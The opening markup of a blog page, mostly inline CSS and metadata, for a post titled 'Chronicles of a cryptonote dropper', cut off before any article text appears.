<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=es><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content h1{font-size:24px}.franklin-content h3{font-size:20px}.franklin-content h1,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double #d3d3d3;margin-top:1.5em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid #000}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a:hover{text-decoration:underline}.franklin-content .bibref a,.franklin-content .eqref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid #d3d3d3}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:focus,.scrollbox:hover{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metap,.hljs-metas{font-weight:700}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--alt4:#ffbebe;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}body.dark{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content #title a{padding:.5rem;line-height:100%}.franklin-content img{width:auto;text-align:center;padding:0}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__name{display:none}.author__place{font-size:.65em}.page__footer ul>li{list-style-type:none}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content.show{display:block}.lang-link .flag-icon{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu .lang-list{transition:height}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:700;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:700}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>a>h1,.posts_list.franklin-content>.title>h2{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title,.posts_list.franklin-content>.title>h2{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem #fff}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:700}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview,.resultCount{color:gray}.result-query{font-weight:700}footer>*{float:left}footer a{-webkit-text-decoration:underline dotted;text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width:680px){#tag-name,.tag-desc{text-align:left}}@media (min-width:680px) and (max-width:1300px){#site-nav .ham:hover{cursor:pointer}#site-nav .vert{transition:max-height .33s ease-in,filter .33s ease-in}}@media (max-width:680px){.masthead__inner-wrap{display:block}#tag-name,.tag-desc{text-align:center}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width:680px){footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title:after{-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:active,.hvr-buzz-out:focus,.hvr-buzz-out:hover{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a:before{transition-property:left,right;transition-duration:.3s;transition-timing-function:ease-out}.franklin-content a:active:before,.franklin-content a:focus:before,.franklin-content a:hover:before{left:0;right:0}.hvr-outline-in:before{pointer-events:none;transition-duration:.2s;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:active:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:hover:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:active:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:hover:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}.masthead__menu ul li.author__avatar img{transition:transform .8s}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><meta charset=UTF-8><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="sitio de untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/es/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.webp property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.webp","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.webp","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><style>:root{--block-background:var(--accent2);--small:14px;--normal:19px;--text-color:hsv(0, 0%, 20%)}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width:940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width:480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h2{font-size:22px}h2{text-align:left}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid #d3d3d3;margin-top:2em;margin-bottom:1em}.franklin-content h2 a{color:inherit}.franklin-content a{color:var(--alt2);text-decoration:none}body{counter-reset:eqnum}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}@media (prefers-color-scheme:light){body{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}}@media (prefers-color-scheme:dark){body{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.franklin-content{color:var(--foreground-color)}.franklin-content .header-anchor{padding:.5rem!important;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}body>div>h1{text-align:center;color:var(--accent2)}body>div #page-description,body>div #title{text-align:center}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:700;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier 